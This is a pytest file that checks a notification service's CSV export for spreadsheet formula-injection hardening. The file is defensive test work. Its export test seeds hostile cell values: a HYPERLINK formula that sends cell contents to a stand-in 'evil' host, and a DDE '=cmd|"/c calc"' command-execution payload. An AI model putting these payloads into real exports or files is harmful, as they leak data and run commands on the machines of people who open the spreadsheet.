"""
Tests for CSV export formula-injection hardening.

Notification content is attacker-controlled via the ingestion endpoint;
cells starting with =, +, -, @, tab, or CR must be neutralized so they are
not executed as formulas when the export is opened in Excel/Sheets.
"""

import csv
import io

import pytest
from sqlalchemy.ext.asyncio import AsyncSession

from models import Notification
from services.notifications import _csv_safe, notification_service


class TestCsvSafe:
    @pytest.mark.parametrize("prefix", ["=", "+", "-", "@", "\t", "\r"])
    def test_formula_prefixes_are_neutralized(self, prefix):
        assert _csv_safe(f"{prefix}cmd").startswith("'")

    def test_plain_text_is_unchanged(self):
        assert _csv_safe("hello world") == "hello world"

    def test_empty_string_is_unchanged(self):
        assert _csv_safe("") == ""

    def test_formula_char_mid_string_is_unchanged(self):
        assert _csv_safe("a=b") == "a=b"


async def test_export_csv_neutralizes_injected_formulas(db: AsyncSession, access_token, admin_user):
    _, tok = access_token
    notif = Notification(
        token_id=tok.id,
        sender_name='=HYPERLINK("http://evil/?x"&A1,"click")',
        title="+1234567890",
        message='=cmd|"/c calc"!A0',
        raw_payload='{"=2+2": "x"}',
    )
    db.add(notif)
    await db.flush()

    csv_data = await notification_service.export_csv(
        db, query=None, after=None, before=None, user_id=admin_user.id, is_admin=True
    )
    rows = list(csv.reader(io.StringIO(csv_data)))
    header, data = rows[0], rows[1:]
    by_col = {name: idx for idx, name in enumerate(header)}
    exported = next(r for r in data if "calc" in r[by_col["message"]])

    assert exported[by_col["sender_name"]].startswith("'=")
    assert exported[by_col["title"]].startswith("'+")
    assert exported[by_col["message"]].startswith("'=")
    assert exported[by_col["custom_fields"]].startswith("'")
